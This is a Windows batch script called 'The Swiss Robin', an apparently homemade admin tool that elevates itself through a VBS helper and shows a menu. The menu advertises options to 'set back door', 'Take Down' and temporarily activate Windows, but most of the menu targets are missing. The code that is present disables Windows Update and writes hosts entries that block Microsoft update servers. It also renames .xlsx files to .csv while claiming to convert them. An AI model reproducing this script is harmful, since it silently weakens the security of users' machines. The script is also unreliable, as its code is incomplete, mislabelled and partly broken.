@echo off
title The Swiss Robin.
ECHO =============================
ECHO Running Admin shell
ECHO =============================

:init
setlocal DisableDelayedExpansion
set "batchPath=%~0"
for %%k in (%0) do set batchName=%%~nk
set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
setlocal EnableDelayedExpansion

:checkPrivileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
ECHO.
ECHO **************************************
ECHO 
ECHO **************************************

ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
ECHO args = "ELEV " >> "%vbsGetPrivileges%"
ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
ECHO Next >> "%vbsGetPrivileges%"
ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
exit /B

:gotPrivileges
setlocal & pushd .
cd /d %~dp0
if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)


:START
::::::::::::::::::::::::::::
CLS
CD /D %~dp0
color 0A
echo                           The Swiss Robin Built by Techiecream
echo.
echo.
echo.                             www.facebook.com/techiecream
echo. 
echo.                                techiecream@gmail.com
echo.loud
echo.                                   +256715192934
echo.
echo.
@echo off
@echo off
title The Swiss Robin.
echo.
echo Your are running As an Administrator
echo Good Luck
echo.
color 0A
::Rundll32.exe User32.dll,LockWorkStation
echo Choose your poison
echo 1) Copy Files
echo 2) Check network
echo 3) Recon and set back door
echo 4) Scan Flash Drive For Viruses
echo 5) Fix a dead flash
echo 6) Set and Reset Proxy
echo 7) Move Music Files
echo 8) Format Drive
echo 9) Speed up and Create Space
echo 11) start Browser
echo 12) Change Language
echo 13) Take Down
echo 14) Download Software
echo 15) Temporary Activate Windows
echo 16) Setup Hotspot
echo 17) Secure Folder
echo 18) Enable Windows Script Host 
echo 19) Block Telemetry
echo 20) Convert file
echo 10) Exit
echo 21) Disable Window Update
echo 22) Enable Window Update
::
::
set/p "cho=>"
if %cho%==1 goto Copy
if %cho%==2 goto Internet
if %cho%==3 goto Recon
if %cho%==4 goto Virus
if %cho%==5 goto flash
if %cho%==6 goto proxy
if %cho%==7 goto organiser
if %cho%==8 goto rogue
if %cho%==9 goto speed
if %cho%==10 goto exit
if %cho%==11 goto firesk
if %cho%==12 goto safefail
if %cho%==13 goto sopelete
if %cho%==14 goto programlist
if %cho%==15 goto Activawin
if %cho%==16 goto hotspot
if %cho%==17 goto secure
if %cho%==18 goto EWSHM
if %cho%==19 goto BMS
if %cho%==20 goto XLXSCSV
if %cho%==21 goto disalw
if %cho%==22 goto aalwd
echo Invalid choice.
goto start

:disalw
@Echo Stopping the Windows Update Service ...
@echo off
Net stop wuauserv
@echo ***********************************
@Echo Disabling the Windows Update Service ...
@echo off
sc config "wuauserv" start=disabled
@echo ***********************************
@echo Finished ....
pause
goto start
:aalwd
@Echo Starting the Windows Update Service ...
@echo off
Net start wuauserv
@echo ***********************************
@Echo Enabling the Windows Update Service ...
@echo off
sc config "wuauserv" start=auto
@echo ***********************************
@echo Finished ....
pause
:exit
echo timing out in 5
timeout 5 >nul
exit
:XLXSCSV
@echo off
echo file must be excel file
ren "*.xlsx" "*.csv"
echo DONE
goto start
:BMS
echo choose
echo 1) Enable Spying
echo 2) Disable Spying
echo Press any key to cancel
set/p "BMSC=>"
if %BMSC%==1 goto BMSE
if %BMSC%==2 goto BMSD
echo Invalid choice.
goto start

:BMSE
echo open C:\Windows\System32\Drivers\etc\hosts
echo delete everything below the line 
echo #######New changes begin here##### 
goto start
:BMSD
color 0C
echo ###########################################################################
echo # WINDOWS 10 SPYBLOCK HOSTS FILE + NVIDIA TELEMETRY                       #
echo # https://encrypt-the-planet.com/windows-10-anti-spy-host-file/           #
echo ###########################################################################
echo
echo #######New changes begin here##### >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1 localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo ::1 localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1       localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1 localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo ::1 localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1       localhost >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1 localhost   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1 localhost.localdomain   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 127.0.0.1 local   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 255.255.255.255 broadcasthost   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ::1 localhost   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ::1 ip6-localhost   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ::1 ip6-loopback   >>"C:\Windows\System32\Drivers\etc\hosts"
echo fe80::1%lo0 localhost   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ff00::0 ip6-localnet   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ff00::0 ip6-mcastprefix   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ff02::1 ip6-allnodes   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ff02::2 ip6-allrouters   >>"C:\Windows\System32\Drivers\etc\hosts"
echo ff02::3 ip6-allhosts   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 0.0.0.0   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 gfswl.geforce.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.nvidia.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ssl.google-analytics.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 gfe.nvidia.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry-dce.gfe.nvidia.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 events-dc1.gfe.nvidia.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e584.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e9398.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 us.configsvc1.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e1723.g.akamaiedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e-0009.e-msedge.net#ALSO USED IN MS LIST   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 s-0001.s-msedge.net#ALSO USED IN SKYPE   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 prod-w.nexus.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vip5.afdorigin-prod-sg02.afdogw.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vip5.afdorigin-prod-ln02.afdogw.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vip5.afdorigin-prod-am02.afdogw.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vip5.afdorogin-prod-hk02.afdogw.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vip5.afdorigin-prod-ch02.afdogw.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 prod.nexusrules.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 gateway.skyprod.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 118-163-160-187-HINET-IP.hinet.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0001.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0002.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0003.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0004.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0005.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0006.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0007.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0008.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0009.a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads1.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads2.msads.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads2.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.rad.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ac3.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ad.doubleclick.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 adnexus.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 adnxs.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads1.msads.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads1.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads.avocet.io  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads.mopub.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 aidps.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 aka-cdn-ns.adtech.de  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 api.mixpanel.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 api.redshell.io  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 app.adjust.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 app.adjust.io  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 apps.skype.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 az361816.vo.msecnd.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 az512334.vo.msecnd.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.ads1.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.ads2.msads.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.rad.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bs.serving-sys.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 c.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ca.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cache.datamart.windows.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cdn.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cds26.ams9.msecn.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 choice.microsoft.com.nstac.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 compatexchange.cloudapp.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 corp.sts.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 corpext.msitadfs.glbdns2.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 cs1.wpc.v0cdn.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 db3aqu.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 decide.mixpanel.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 df.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 diagnostics.support.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 e.crashlytics.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ec.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 fe2.update.microsoft.com.akadns.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.microsoft-hohm.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.search.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 feedback.windows.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 flex.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 g.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 gate.hockeyapp.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 h1.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i1.services.social.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i1.services.social.microsoft.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 in.treasuredata.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 lb1.www.ms.akadns.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 live.rads.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 m.adnxs.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 m.hotmail.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msedge.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msftncsi.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-65-55-108-23.search.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msntest.serving-sys.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 oca.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 oca.telemetry.microsoft.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 pre.footprintpredict.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 preview.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 pricelist.skype.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 rad.live.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 rad.msn.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redir.metaservices.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redshell.io  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 reports.wes.df.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 s0.2mdn.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 s.gateway.messenger.live.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 schemas.microsoft.akadns.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 secure.adnxs.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 secure.flashtalking.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 services.wes.df.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings-sandbox.data.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings-win.data.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings.crashlytics.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sls.update.microsoft.com.akadns.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynet2.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynetalt.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.df.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.telemetry.microsoft.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ssl.google-analytics.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 static.2mdn.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe1.ws.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe2.update.microsoft.com.akadns.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe2.ws.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 survey.watson.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 t.appsflyer.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telecommand.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telecommand.telemetry.microsoft.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.appex.bing.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.urs.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 treasuredata.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 view.atdmt.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-bn2.metron.live.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-cy2.metron.live.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-sandbox.data.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-win.data.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex.data.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.live.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.ppe.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.telemetry.microsoft.com.nsatc.net  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wes.df.telemetry.microsoft.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 www.msftncsi.com  >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a0001.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a23-43-234-79.deploy.static.akamaitechnologies.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a458.g.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a767.dscd.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a767.dspw65.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a978.i6g1.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a1051.d.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a1213.g.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a1639.g1.akamai.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0001.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0002.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0003.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0004.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0005.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0006.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0007.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0008.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0009.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0010.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0011.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a-0012.a-msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads1.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads2.msads.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.ads2.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 a.rad.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ac3.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 activity.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ad.doubleclick.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 adnexus.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 adnxs.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads1.msads.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads1.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ads.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 aidps.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 aka-cdn-ns.adtech.de   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 aka.ms   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 alpha.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 americas1.notify.windows.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 americas2.notify.windows.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 amp-reddit-com.cdn.ampproject.org   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 any.edge.bing.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 apac1.notify.windows.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 api.cortana.ai   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 api.redshell.io   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 arc.msn.com-nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 array615-prod-do.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 asimov-win.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 asimov.settings.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 atlas.c10r.facebook.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 az361816.vo.msecnd.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 az512334.vo.msecnd.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.ads1.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.ads2.msads.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 b.rad.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bing.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bingads.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bl3301-a.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bl3301-c.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bl3301-g.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bl3302.storage.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bl3302geo.storage.dkyprod.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 blob.bl2prdstr03a.store.core.windows.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn1wns2011508.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2.displaycatalog.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2b-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2b-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2b-cor003.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2b-cor004.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2licensing.md.mp.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2wns1.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn2wns1b.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3p-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010536.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010558.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010560.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010618.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010626.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010629.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010631.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010635.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010636.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020010650.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020011727.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN3SCH020011855.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020012850.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020020322.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020020749.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020022328.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 BN3SCH020022331.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020022335.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn3sch020022361.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 bn4sch101120814.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
